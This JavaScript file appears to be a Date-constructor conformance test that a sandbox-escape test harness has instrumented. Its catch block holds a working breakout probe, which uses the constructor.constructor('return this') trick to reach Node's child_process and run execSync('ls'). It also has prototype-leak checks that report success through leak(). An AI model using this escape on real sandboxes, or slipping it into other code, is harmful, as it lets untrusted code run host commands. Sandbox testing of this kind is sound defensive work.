try {
    var d1 = new Date(Number.NaN);
    assert.sameValue(d1.valueOf(), NaN, 'NaN');
    var d2 = new Date(Infinity);
    assert.sameValue(d2.valueOf(), NaN, 'Infinity');
    var d3 = new Date(-Infinity);
    assert.sameValue(d3.valueOf(), NaN, '-Infinity');
    var d4 = new Date(0);
    if (d4.valueOf() !== 0) {
        $ERROR('#4: var d4 = new Date(0); d4.valueOf() === 0;');
    }
    var d5 = new Date(-0);
    if (d5.valueOf() !== -0) {
        $ERROR('#5: var d5 = new Date(-0); d5.valueOf() === -0;');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}